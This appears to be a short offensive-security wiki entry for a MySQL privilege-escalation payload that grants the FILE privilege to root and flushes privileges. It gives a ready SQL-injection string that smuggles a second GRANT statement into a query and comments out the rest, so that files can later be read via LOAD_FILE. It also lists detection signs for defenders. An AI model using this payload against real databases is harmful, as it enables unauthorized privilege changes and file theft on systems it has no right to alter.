---
id: 4ee32772-99e5-432f-a8ad-a70bb95c6824
name: mysql-grant-file-privilege-sql
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:34.767752+00:00'
updated_at: '2023-04-10T20:22:51.271599+00:00'
platforms:
  - Linux
tags:
  - mysql
  - privilege-escalation
  - sql
validated: true
---

# mysql-grant-file-privilege-sql

## Code

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## Description

This SQL code grants the FILE privilege to the root user for all databases and tables, then flushes privileges to apply changes immediately. The trailing # comments out any following SQL. It is used to enable file read/write operations like LOAD_FILE when direct MySQL access is available.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'root'@'localhost' | Target user@host; change to current user if needed | 'app_user'@'%' |
| *.* | Scope: all databases and tables | specific_db.* |

## Usage

Execute directly in mysql client if admin access: mysql -u root -p -e "GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#". In injection, if high priv: inject as ' ; GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;# --. Verify with SHOW GRANTS.

## Detection

- Audit logs showing GRANT statements for FILE privilege.
- Privilege table changes in mysql.user (File_priv = 'Y').
- Alerts on FLUSH PRIVILEGES executions from non-admin sessions.
- In injection contexts, unusual semicolon or # in query strings.

## Related

- [[procedures/mysql-file-content-extraction-via-injection]]
- [[commands/mysql-grant-file-privilege]]
